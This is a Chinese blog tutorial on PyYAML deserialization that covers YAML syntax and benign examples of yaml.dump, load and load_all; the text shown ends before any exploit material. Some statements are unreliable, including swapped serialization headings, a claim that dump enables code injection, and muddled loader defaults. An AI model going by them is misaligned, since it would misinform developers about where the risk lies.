onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div><div class="console-card-group"><div class="console-card-group-left"><div class="console-card" id="card-newest-comments"><div class="card-content"><div class="author-content-item-tips">互动</div><span class="author-content-item-title"> 最新评论</span></div><div class="aside-list"><span>正在加载中...</span></div></div></div><div class="console-card-group-right"><div class="console-card tags"><div class="card-content"><div class="author-content-item-tips">兴趣点</div><span class="author-content-item-title">寻找你感兴趣的领域</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/CTF%E8%B5%9B%E4%BA%8B/" style="font-size: 1.05rem;">CTF赛事<sup>18</sup></a><a href="/tags/CVE/" style="font-size: 1.05rem;">CVE<sup>15</sup></a><a href="/tags/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 1.05rem;">Java反序列化<sup>3</sup></a><a href="/tags/Java%E5%9F%BA%E7%A1%80/" style="font-size: 1.05rem;">Java基础<sup>1</sup></a><a href="/tags/Linux%E6%8F%90%E6%9D%83/" style="font-size: 1.05rem;">Linux提权<sup>2</sup></a><a href="/tags/MISC/" style="font-size: 1.05rem;">MISC<sup>1</sup></a><a href="/tags/Metasploit/" style="font-size: 1.05rem;">Metasploit<sup>3</sup></a><a href="/tags/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 1.05rem;">PHP代码审计<sup>2</sup></a><a href="/tags/SecBook/" style="font-size: 1.05rem;">SecBook<sup>1</sup></a><a href="/tags/TryHackMe/" style="font-size: 1.05rem;">TryHackMe<sup>42</sup></a><a href="/tags/Windows%E6%8F%90%E6%9D%83/" style="font-size: 1.05rem;">Windows提权<sup>2</sup></a><a href="/tags/reverse%E7%B3%BB%E5%88%97/" style="font-size: 1.05rem;">reverse系列<sup>2</sup></a><a href="/tags/tryhackme/" style="font-size: 1.05rem;">tryhackme<sup>1</sup></a><a href="/tags/web%E6%B8%97%E9%80%8F/" style="font-size: 1.05rem;">web渗透<sup>2</sup></a><a href="/tags/web%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/" style="font-size: 1.05rem;">web知识总结<sup>2</sup></a><a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 1.05rem;">代码审计<sup>1</sup></a><a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" style="font-size: 1.05rem;">内网渗透<sup>3</sup></a><a href="/tags/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/" style="font-size: 1.05rem;">内网靶场<sup>2</sup></a><a href="/tags/%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/" style="font-size: 1.05rem;">基本知识<sup>21</sup></a><a href="/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" style="font-size: 1.05rem;">基础知识<sup>1</sup></a><a href="/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/" style="font-size: 1.05rem;">攻防世界<sup>1</sup></a><a href="/tags/%E7%8E%84%E6%9C%BA%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA/" style="font-size: 1.05rem;">玄机应急响应靶场<sup>1</sup></a><a href="/tags/%E7%BA%A2%E9%98%9F%E6%B8%97%E9%80%8F/" style="font-size: 1.05rem;">红队渗透<sup>1</sup></a></div></div><hr/></div></div><div class="console-card history"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-box-archiv"></i><span>文章</span></div><div class="card-archives"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-archive"></i><span>归档</span><a class="card-more-btn" href="/archives/" title="查看更多">
    <i class="anzhiyufont anzhiyu-icon-angle-right"></i></a></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/08/"><span class="card-archive-list-date">八月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">12</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/07/"><span class="card-archive-list-date">七月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">16</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/06/"><span class="card-archive-list-date">六月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">9</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/05/"><span class="card-archive-list-date">五月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">7</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/04/"><span class="card-archive-list-date">四月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">5</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/03/"><span class="card-archive-list-date">三月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">18</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/02/"><span class="card-archive-list-date">二月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">12</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/01/"><span class="card-archive-list-date">一月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">2</span><span>篇</span></div></a></li></ul></div><hr/></div></div></div><div class="button-group"><div class="console-btn-item"><a class="darkmode_switchbutton" title="显示模式切换" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-moon"></i></a></div><div class="console-btn-item" id="consoleHideAside" onclick="anzhiyu.hideAsideBtn()" title="边栏显示控制"><a class="asideSwitch"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></a></div><div class="console-btn-item" id="consoleMusic" onclick="anzhiyu.musicToggle()" title="音乐开关"><a class="music-switch"><i class="anzhiyufont anzhiyu-icon-music"></i></a></div></div><div class="console-mask" onclick="anzhiyu.hideConsole()" href="javascript:void(0);"></div></div><div class="nav-button" id="nav-totop"><a class="totopbtn" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i><span id="percent" onclick="anzhiyu.scrollToDest(0,500)">0</span></a></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);" title="切换"><i class="anzhiyufont anzhiyu-icon-bars"></i></a></div></div></div></nav><div id="post-info"><div id="post-firstinfo"><div class="meta-firstline"><a class="post-meta-original">原创</a><span class="post-meta-categories"><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-inbox post-meta-icon"></i><a class="post-meta-categories" href="/categories/web%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/" itemprop="url">web知识总结</a></span><span class="article-meta tags"><a class="article-meta__tags" href="/tags/%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/" tabindex="-1" itemprop="url"> <span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>基本知识</span></a></span></div></div><h1 class="post-title" itemprop="name headline">PyYmal反序列化</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="anzhiyufont anzhiyu-icon-calendar-days post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" itemprop="dateCreated datePublished" datetime="2024-03-23T07:11:50.882Z" title="发表于 2024-03-23 15:11:50">2024-03-23</time><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-history post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" itemprop="dateCreated datePublished" datetime="2024-03-23T14:20:54.410Z" title="更新于 2024-03-23 22:20:54">2024-03-23</time></span></div><div class="meta-secondline"><span class="post-meta-separator"></span><span class="post-meta-wordcount"><i class="anzhiyufont anzhiyu-icon-file-word post-meta-icon" title="文章字数"></i><span class="post-meta-label" title="文章字数">字数总计:</span><span class="word-count" title="文章字数">9k</span><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-clock post-meta-icon" title="阅读时长"></i><span class="post-meta-label" title="阅读时长">阅读时长:</span><span>34分钟</span></span><span class="post-meta-separator"></span><span class="post-meta-pv-cv" id="" data-flag-title="PyYmal反序列化"><i class="anzhiyufont anzhiyu-icon-fw-eye post-meta-icon"></i><span class="post-meta-label" title="阅读量">阅读量:</span><span id="busuanzi_value_page_pv"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-spin"></i></span></span><span class="post-meta-separator">       </span><span class="post-meta-position" title="作者IP属地为太原"><i class="anzhiyufont anzhiyu-icon-location-dot"></i>太原</span><span class="post-meta-separator"></span><span class="post-meta-commentcount"><i class="anzhiyufont anzhiyu-icon-comments post-meta-icon"></i><span class="post-meta-label">评论数:</span><a href="/2024/03/23/pyyaml-fan-xu-lie-hua/#post-comment" itemprop="discussionUrl"><span class="valine-comment-count" data-xid="/2024/03/23/pyyaml-fan-xu-lie-hua/" itemprop="commentCount"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-spin"></i></span></a></span></div></div></div><section class="main-hero-waves-area waves-area"><svg class="waves-svg" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M -160 44 c 30 0 58 -18 88 -18 s 58 18 88 18 s 58 -18 88 -18 s 58 18 88 18 v 44 h -352 Z"></path></defs><g class="parallax"><use href="#gentle-wave" x="48" y="0"></use><use href="#gentle-wave" x="48" y="3"></use><use href="#gentle-wave" x="48" y="5"></use><use href="#gentle-wave" x="48" y="7"></use></g></svg></section><div id="post-top-cover"><img class="nolazyload" id="post-top-bg" src=""></div></header><main id="blog-container"><div class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container" itemscope itemtype="http://hybcx.xyz/2024/03/23/pyyaml-fan-xu-lie-hua/"><header><a class="post-meta-categories" href="/categories/web%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/" itemprop="url">web知识总结</a><a href="/tags/%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/" tabindex="-1" itemprop="url">基本知识</a><h1 id="CrawlerTitle" itemprop="name headline">PyYmal反序列化</h1><span itemprop="author" itemscope itemtype="http://schema.org/Person">hybcx</span><time itemprop="dateCreated datePublished" datetime="2024-03-23T07:11:50.882Z" title="发表于 2024-03-23 15:11:50">2024-03-23</time><time itemprop="dateCreated datePublished" datetime="2024-03-23T14:20:54.410Z" title="更新于 2024-03-23 22:20:54">2024-03-23</time></header><h1 id="0x01-ymal简介">0x01 YMAL简介</h1>
<p>YAML是一种轻量级的数据序列化语言，它的名称是"YAML Ain’t Markup Language"的递归缩写。它的设计目标是成为一种人类可读的数据交换格式。</p>
<p>YAML的语法非常简洁，使用缩进和特定的符号来表示数据结构。它支持多种数据类型，包括标量（字符串、数字、布尔值等）、序列（数组、列表等）和映射（键值对）。YAML还支持注释和引用，可以使文档更易于理解和维护。（其文件一般以.yml为后缀）</p>
<h1 id="0x02-yaml基本语法">0x02 Yaml基本语法</h1>
<p>这里也就是纯cv了。</p>
<ul>
<li>
<p><strong>大小写敏感</strong></p>
<pre><code class="hljs scss">aaa:<span class="hljs-number">1</span>
AAA:<span class="hljs-number">2</span></code></pre>
<p>这两个对于Yaml来说是不同的变量</p>
</li>
<li>
<p><strong>使用缩进表示层级关系缩进不允许使用tab，只允许空格</strong></p>
</li>
<li>
<p><strong>缩进的空格数不重要，只要相同层级的元素左对齐即可</strong></p>
<p>举个例子，</p>
<pre><code class="hljs scss"># This is <span class="hljs-selector-tag">a</span> YAML document with nested structures
person:
  name: John
  age: <span class="hljs-number">30</span>
  address:
    street: Main St.
    city: Anytown
    state: CA
  hobbies:
    - reading
    - hiking
    - swimming</code></pre>
<p>在这个示例中，<code>person</code>是一个映射类型，包含四个键值对。其中<code>address</code>和<code>hobbies</code>都是映射类型和序列类型的嵌套结构，使用缩进表示层级关系。<code>address</code>包含三个键值对，<code>hobbies</code>包含一个序列，其中包含三个元素。</p>
</li>
<li>
<p><strong>'#'表示注释</strong></p>
<p>但是只能支持单行注释</p>
<pre><code class="hljs scss">#注释<span class="hljs-number">1</span>
#注释<span class="hljs-number">2</span></code></pre>
</li>
<li>
<p><strong>一个文件中可以包含多个文件的内容，用“ — ”即三个破折号表示一份内容的开始，用“ … ”即三个小数点表示一份内容的结束（非必需）</strong></p>
</li>
</ul>
<pre><code class="hljs scss">---
example1:
  username: admin
  passwd: <span class="hljs-number">123456</span>
...

---
example2:
  username: aaa
  passwd: <span class="hljs-number">666</span>
...</code></pre>
<h1 id="0x03-yaml数据类型与结构">0x03 Yaml数据类型与结构</h1>
<ul>
<li>
<p><strong>标量（Scalar）</strong>：标量是YAML中的基本数据类型，包括字符串、整数、浮点数、布尔值等。例如：</p>
<pre><code class="hljs scss">name: <span class="hljs-string">"John"</span>  # 字符串
age: <span class="hljs-number">30</span>       # 整数 （可以支持二进制表示）
height: <span class="hljs-number">5.8</span>   # 浮点数 （可以支持科学计数法）
is_student: false  # 布尔值 (null,Null,~均为空)</code></pre>
</li>
<li>
<p><strong>列表（List）</strong>：列表用短横线（-）表示，可以包含多个标量值，形成一个有序的序列。例如：</p>
<pre><code class="hljs scss">fruits:
  - apple
  - banana
  - orange</code></pre>
<p>支持<strong>内敛格式</strong>（用方括号包裹，用逗号+空格分隔），例如：</p>
<pre><code class="hljs scss">fruit: [apple, banana, orange]</code></pre>
<p>支持多维数组（<strong>用缩进表示层级关系</strong>），例如：</p>
<pre><code class="hljs scss">fruit: 
-
  - apple
  - banana
-
  - orange</code></pre>
</li>
<li>
<p><strong>映射（Mapping）</strong>：映射用键值对表示，使用冒号（:）分隔键和值，可以包含多个键值对，形成一个无序的键值对集合。例如：</p>
<pre><code class="hljs scss">person:
  name: John
  age: <span class="hljs-number">30</span>
  city: New York</code></pre>
<p>支持<strong>流式风格</strong>的语法(用花括号包裹，用逗号+空格分割)，例如：</p>
</li>
</ul>
<pre><code class="hljs scss">key: { username: admin, passwd: <span class="hljs-number">123456</span>}</code></pre>
<p>可以使用“?”声明一个复杂对象，从而可以使用多个数组来组成键，例如：</p>
<pre><code class="hljs scss">?
  - user1
  - user2
:
  - passwd1
  - passwd2</code></pre>
<p>允许多层嵌套(<strong>用缩进表示层级关系</strong>)，例如：</p>
<pre><code class="hljs scss">example:
  aaa: <span class="hljs-number">123</span>
  bbb:
    ccc:
      ddd: <span class="hljs-number">666</span></code></pre>
<p>在这个示例中，<code>example</code>是一个映射类型，包含一个键值对<code>aaa</code>和一个键值对<code>bbb</code>。<code>bbb</code>的值是一个映射类型，包含一个键值对<code>ccc</code>，而<code>ccc</code>的值又是一个映射类型，包含一个键值对<code>ddd</code>。<code>ddd</code>的值为<code>666</code>。</p>
<ul>
<li>
<p><strong>多行字符串（Multi-line String）</strong>：YAML支持在标量值中使用多行字符串，可以使用管道符（|）或折叠式大于号（&gt;）来表示。例如：</p>
<pre><code class="hljs scss">description: |
  This is a multi-line
  string using the pipe symbol. # 每行的缩进和行尾空白都会被去掉，而额外的缩进会被保留
lines: &gt;
  aaa
  bbbbbb
  ccccccc

  dddddddd  # 只有空白行才会被识别为换行，原来的换行符都会被转换成空格</code></pre>
<p>字符串一般不用引号包裹，但是如果字符串中使用了<strong>反斜杠“\”开头的转义字符就必须用引号包裹</strong>，例如</p>
<pre><code class="hljs scss">strings: 
  - Hi
  - <span class="hljs-string">"\u0048\u0069"</span> # Hi的Unicode编码
  - <span class="hljs-string">"\x46\x69\x6e\x65"</span> # Fine的Hex编码</code></pre>
<p><strong>引用（Reference）</strong>：YAML支持使用锚点（&amp;）和别名（*）来创建引用，可以在不同位置引用相同的值。例如：</p>
<pre><code class="hljs scss">person1: &amp;person_alias
  name: John
  age: <span class="hljs-number">30</span>

person2: *person_alias</code></pre>
<p>相当于</p>
<pre><code class="hljs scss">person1:
  name: John
  age: <span class="hljs-number">30</span>

person2:
  name: John
  age: <span class="hljs-number">30</span></code></pre>
<p>可以利用**锚点（&amp;）和别名（*）<strong>以及</strong>合并标签"&lt;&lt;"**将我们的yaml变得更加整洁，例如：</p>
<pre><code class="hljs scss"># 使用锚点和别名消除重复代码
defaults: &amp;defaults
  host: localhost
  port: <span class="hljs-number">8080</span>
  timeout: <span class="hljs-number">30</span>

development:
  &lt;&lt;: *defaults
  database: dev_db

test:
  &lt;&lt;: *defaults
  database: test_db
  timeout: <span class="hljs-number">60</span>

production:
  &lt;&lt;: *defaults
  host: prod_host
  port: <span class="hljs-number">80</span></code></pre>
<p>相当于</p>
<pre><code class="hljs scss">development:
  host: localhost
  port: <span class="hljs-number">8080</span>
  timeout: <span class="hljs-number">30</span>
  database: dev_db

test:
  host: localhost
  port: <span class="hljs-number">8080</span>
  timeout: <span class="hljs-number">60</span>
  database: test_db

production:
  host: prod_host
  port: <span class="hljs-number">80</span>
  timeout: <span class="hljs-number">30</span></code></pre>
</li>
<li>
<p><strong>时间戳（Timestamp）</strong>：在YAML中，可以使用ISO 8601格式的时间戳来表示日期和时间。ISO 8601是一种国际标准，用于表示日期、时间和日期时间的格式，例如：</p>
<pre><code class="hljs scss">timestamp: <span class="hljs-number">2023</span>-<span class="hljs-number">04</span>-<span class="hljs-number">24</span>T12:<span class="hljs-number">34</span>:<span class="hljs-number">56.789</span>Z</code></pre>
</li>
</ul>
<p><strong>类型转换</strong></p>
<p>Yaml支持使用**严格类型标签"!!"（双感叹号+目标类型）**来强制转换类型，例如：</p>
<pre><code class="hljs scss"># 使用显式类型转换将字符串转换成整数和浮点数
age: !!int <span class="hljs-number">30</span>
pi: !!float <span class="hljs-number">3.14</span>

# 使用显式类型转换将数字转换成字符串
number_as_str: !!str <span class="hljs-number">123</span>

# 使用显式类型转换将字符串转换成布尔值
is_valid: !!bool <span class="hljs-string">"true"</span>

# 使用显式类型转换将时间戳转换成日期时间
created_at: !!timestamp <span class="hljs-number">2023</span>-<span class="hljs-number">04</span>-<span class="hljs-number">24</span>T12:<span class="hljs-number">34</span>:<span class="hljs-number">56.789</span>Z

# 使用显式类型转换将列表转换成其他类型
list_as_str: !!str [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>]
list_as_map: !!map [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>]</code></pre>
<h1 id="0x04-反序列化漏洞成因">0x04 反序列化漏洞成因</h1>
<h2 id="pyyamllt51">PyYaml&lt;=5.1</h2>
<p>在python中的PyYAML库中提供这几种方式实现python和Yaml这两种语言的转换。</p>
<h3 id="yaml-gtpython">yaml-&gt;python</h3>
<p><strong>yaml.dump</strong></p>
<pre><code class="hljs scss">yaml<span class="hljs-selector-class">.dump</span>(data)</code></pre>
<p>将Python对象<code>data</code>转换为YAML格式的方法。它将Python对象序列化为YAML格式的字符串，并返回这个字符串。在这个方法中，<code>data</code>是一个Python对象，可以是字典、列表、元组、整数、浮点数、字符串、布尔值等基本数据类型，也可以是自定义的类的实例。</p>
<p>举个例子：</p>
<pre><code class="hljs py"><span class="hljs-keyword">import</span> yaml

data = {
    <span class="hljs-string">'name'</span>: <span class="hljs-string">'John'</span>,
    <span class="hljs-string">'age'</span>: <span class="hljs-number">30</span>,
    <span class="hljs-string">'is_student'</span>: <span class="hljs-literal">True</span>,
    <span class="hljs-string">'hobbies'</span>: [<span class="hljs-string">'reading'</span>, <span class="hljs-string">'swimming'</span>, <span class="hljs-string">'traveling'</span>],
    <span class="hljs-string">'address'</span>: {
        <span class="hljs-string">'street'</span>: <span class="hljs-string">'123 Main St'</span>,
        <span class="hljs-string">'city'</span>: <span class="hljs-string">'Anytown'</span>,
        <span class="hljs-string">'state'</span>: <span class="hljs-string">'CA'</span>,
        <span class="hljs-string">'zip'</span>: <span class="hljs-string">'12345'</span>
    }
}

yaml_data = yaml.dump(data)

<span class="hljs-built_in">print</span>(yaml_data)</code></pre>
<p>输出结果：</p>
<pre><code class="hljs scss"><span class="hljs-selector-tag">address</span>:
  city: Anytown
  state: CA
  street: <span class="hljs-number">123</span> Main St
  zip: <span class="hljs-string">'12345'</span>
age: <span class="hljs-number">30</span>
hobbies:
- reading
- swimming
- traveling
is_student: true
name: John</code></pre>
<p>在这段代码中， 我们定义了一个data字典，然后使用yaml.dump方法将data对象序列为yaml格式，并赋值给yaml_data，最后打印出来，得到我们最终的yaml格式数据</p>
<p>其实通俗点来说，就是将python的对象实例转化为yaml格式的字符串，也就是<strong>序列化</strong>。</p>
<p>如果我们的Python对象中包含自定义类的实例、函数等，那么使用<code>yaml.dump</code>方法进行序列化可能会导致安全问题。攻击者可以通过在YAML数据中注入恶意代码来执行任意代码，从而导致应用程序受到攻击。</p>
<h3 id="python-gtyaml">python-&gt;yaml</h3>
<p><strong>load()</strong></p>
<pre><code class="hljs scss"><span class="hljs-built_in">load</span>(data)</code></pre>
<p><code>load(data)</code>是将YAML格式的字符串转换为Python对象的方法。它将YAML格式的字符串反序列化为Python对象，并返回这个对象。在这个方法中，<code>data</code>是一个包含YAML格式字符串的变量，可以是从文件中读取的字符串，也可以是用户输入的字符串等。</p>
<pre><code class="hljs py"><span class="hljs-keyword">import</span> yaml

data = <span class="hljs-string">"""</span>
<span class="hljs-string">address:</span>
<span class="hljs-string">  city: Anytown</span>
<span class="hljs-string">  state: CA</span>
<span class="hljs-string">  street: 123 Main St</span>
<span class="hljs-string">  zip: '12345'</span>
<span class="hljs-string">age: 30</span>
<span class="hljs-string">hobbies:</span>
<span class="hljs-string">- reading</span>
<span class="hljs-string">- swimming</span>
<span class="hljs-string">- traveling</span>
<span class="hljs-string">is_student: true</span>
<span class="hljs-string">name: John</span>
<span class="hljs-string">"""</span>

yaml_data = yaml.load(data, Loader=yaml.Loader)
<span class="hljs-built_in">print</span>(yaml_data)</code></pre>
<p>这里看文章他只使用load(data)就能行，但我这里必须添加Loader解析器参数</p>
<pre><code class="hljs scss">{'<span class="hljs-selector-tag">address</span>': {'city': <span class="hljs-string">'Anytown'</span>, <span class="hljs-string">'state'</span>: <span class="hljs-string">'CA'</span>, <span class="hljs-string">'street'</span>: <span class="hljs-string">'123 Main St'</span>, <span class="hljs-string">'zip'</span>: <span class="hljs-string">'12345'</span>}, 'age': <span class="hljs-number">30</span>, <span class="hljs-string">'hobbies'</span>: [<span class="hljs-string">'reading'</span>, <span class="hljs-string">'swimming'</span>, <span class="hljs-string">'traveling'</span>], <span class="hljs-string">'is_student'</span>: True, <span class="hljs-string">'name'</span>: <span class="hljs-string">'John'</span>}</code></pre>
<p>这段代码是将一个包含YAML格式字符串的变量<code>yaml_data</code><strong>反序列化</strong>为Python对象，并将其赋值给变量<code>data</code>。然后，它打印出<code>data</code>，输出反序列化后的Python对象。</p>
<pre><code class="hljs scss"><span class="hljs-built_in">load</span>(data, Loader=yaml.Loader)</code></pre>
<p><code>load(data, Loader=yaml.Loader)</code>是将YAML格式的字符串转换为Python对象的方法，其中<code>Loader</code>参数指定了YAML解析器的类型。</p>
<p>在默认情况下，<code>yaml.load</code>方法使用的解析器是<code>yaml.SafeLoader</code>，它可以安全地解析大多数YAML格式数据，但是不能解析包含Python对象的YAML数据。</p>
<p>&lt;=5.1 版本中提供了几个方法用于解析 YAML：</p>
<pre><code class="hljs scss">yaml<span class="hljs-selector-class">.load</span>：加载单个 YAML 配置
yaml<span class="hljs-selector-class">.load_all</span>：加载多个 YAML 配置</code></pre>
<p>这里说明一下PyYaml&lt;=5.1版本的Loader都有哪些加载器</p>
<pre><code class="hljs scss">Constructor:<span class="hljs-number">5.1</span>版本一下默认此加载器，在 YAML 规范上新增了很多强制类型转换
BaseConstructor：不支持强制类型转换
SafeConstructor：支持强制类型转换和 YAML 规范保持一致</code></pre>
<p>这里以默认的Constructor加载器为例，示例代码：</p>
<pre><code class="hljs py"><span class="hljs-keyword">import</span> yaml

<span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span>:
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, name, age</span>):
        self.name = name
        self.age = age

<span class="hljs-comment"># 自定义构造器函数</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">construct_person</span>(<span class="hljs-params">loader, node</span>):
    <span class="hljs-comment"># 获取Person类的属性值</span>
    data = loader.construct_mapping(node, deep=<span class="hljs-literal">True</span>)
    <span class="hljs-comment"># 实例化Person类并设置属性</span>
    <span class="hljs-keyword">return</span> Person(data[<span class="hljs-string">'name'</span>], data[<span class="hljs-string">'age'</span>])

<span class="hljs-comment"># 将!python/object标签映射到自定义构造器函数</span>
yaml.add_constructor(<span class="hljs-string">'!python/object:__main__.Person'</span>, construct_person)

<span class="hljs-comment"># 定义一个包含自定义类实例的YAML数据</span>
yaml_data = <span class="hljs-string">"""</span>
<span class="hljs-string">name: John</span>
<span class="hljs-string">age: 30</span>
<span class="hljs-string">person:</span>
<span class="hljs-string">  !python/object:__main__.Person</span>
<span class="hljs-string">  name: Alice</span>
<span class="hljs-string">  age: 25</span>
<span class="hljs-string">"""</span>

<span class="hljs-comment"># 使用yaml.Loader()方法解析YAML数据</span>
data = yaml.load(yaml_data, Loader=yaml.Loader)

<span class="hljs-comment"># 输出解析后的Python对象</span>
<span class="hljs-built_in">print</span>(data)</code></pre>
<p>输出结果：</p>
<pre><code class="hljs scss">{'name': <span class="hljs-string">'John'</span>, <span class="hljs-string">'age'</span>: <span class="hljs-number">30</span>, <span class="hljs-string">'person'</span>: &lt;__main__.Person object at <span class="hljs-number">0</span>x000001BA17055390&gt;}</code></pre>
<p>这里对于代码有许多不懂得地方，结合GPT理解一番</p>
<p>首先看这行代码<code>yaml.add_constructor('!python/object:__main__.Person', construct_person)</code></p>
<p>这里就是将<code>!python/object:__main__.Person</code>标签映射到construct_person函数，也就是说，当我们在解析yaml数据的时候，如果遇到了<code>!python/object:__main__.Person</code>标签，那就会自动的去调用construct_person函数。</p>
<p>而construct_person函数有两个参数，其中的node参数实际代表着节点，也就是<code>!python/object:__main__.Person</code>标签所对应的节点person，在调用construct_person函数的时候，会将person节点赋值给node，接着通过loader.construct_mapping函数，获取person节点中的属性值，转换为字典的形式，赋值给data参数，最后return的时候，实例化Person类，将对应的键值传入</p>
<p><strong>load_all(data)</strong>——该函数上面也提到过，这里举个例子来理解</p>
<p><code>load_all(data)</code>是一个函数调用表达式，其中<code>data</code>是一个包含多个YAML文档的字符串。<code>load_all</code>函数是<code>PyYAML</code>模块中的一个方法，用于从一个包含多个YAML文档的字符串中解析出所有的YAML文档，并返回一个生成器对象，每个元素都是一个Python对象，对应一个YAML文档。</p>
<pre><code class="hljs py"><span class="hljs-keyword">import</span> yaml

<span class="hljs-comment"># 定义包含两个YAML文档的字符串</span>
yaml_data = <span class="hljs-string">"""</span>
<span class="hljs-string">- name: John</span>
<span class="hljs-string">  age: 30</span>
<span class="hljs-string"></span>
<span class="hljs-string">- name: Alice</span>
<span class="hljs-string">  age: 25</span>
<span class="hljs-string">"""</span>

<span class="hljs-comment"># 使用yaml.load_all()方法解析所有的YAML文档</span>
docs = yaml.load_all(yaml_data, Loader=yaml.Loader)<span class="hljs-comment">#这里我仍然需要指定解析器参数</span>

<span class="hljs-comment"># 遍历生成器对象并输出解析后的Python对象</span>
<span class="hljs-keyword">for</span> doc <span class="hljs-keyword">in</span> docs:
    <span class="hljs-built_in">print</span>(doc)</code></pre>
<p>输出结果：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240323205101617.png" alt="image-20240323205101617"></p>
<p>这段代码使用<code>PyYAML</code>模块中的<code>yaml.load_all()</code>方法解析包含两个YAML文档的字符串，并输出每个文档解析后的Python对象。</p>
<pre><code class="hljs scss"><span class="hljs-built_in">load_all</span>(data, Loader=yaml.Loader)</code></pre>
<p><code>load_all(data, Loader=yaml.Loader)</code>是一个函数调用表达式，其中<code>data</code>是一个包含多个YAML文档的字符串，<code>yaml.Loader</code>是<code>PyYAML</code>模块中的一个解析器，用于解析YAML文档。</p>
<p>这里以默认的加载器Constructor为例，示例代码：</p>
<pre><code class="hljs py"><span class="hljs-keyword">import</span> yaml

<span class="hljs-comment"># 定义包含两个YAML文档的字符串</span>
yaml_data = <span class="hljs-string">"""</span>
<span class="hljs-string">- name: John</span>
<span class="hljs-string">  age: 30</span>
<span class="hljs-string"></span>
<span class="hljs-string">- name: Alice</span>
<span class="hljs-string">  age: 25</span>
<span class="hljs-string">"""</span>

<span class="hljs-comment"># 使用yaml.load_all()方法解析所有的YAML文档</span>
docs = yaml.load_all(yaml_data, Loader=yaml.Loader)

<span class="hljs-comment"># 遍历生成器对象并输出解析后的Python对象</span>
<span class="hljs-keyword">for</span> doc <span class="hljs-keyword">in</span> docs:
    <span class="hljs-built_in">print</span>(doc)</code></pre>
<p>输出结果：</p>
<pre><code class="hljs scss"><span class="hljs-selector-attr">[{<span class="hljs-string">'name'</span>: <span class="hljs-string">'John'</span>, <span class="hljs-string">'age'</span>: 30}, {<span class="hljs-string">'name'</span>: <span class="hljs-string">'Alice'</span>, <span class="hljs-string">'age'</span>: 25}]</span></code></pre>
<p>这段代码使用<code>PyYAML</code>模块中的<code>yaml.load_all()</code>方法解析包含两个YAML文档的字符串，并输出每个文档解析后的Python对象。</p>
<p>以上是PyYaml&lt;=5.1版本中常见的一些方法实现python和Yaml语言格式的转换的方法，但是往往在这种语言格式的转换的同时，也会存在一定的漏洞点的。</p>
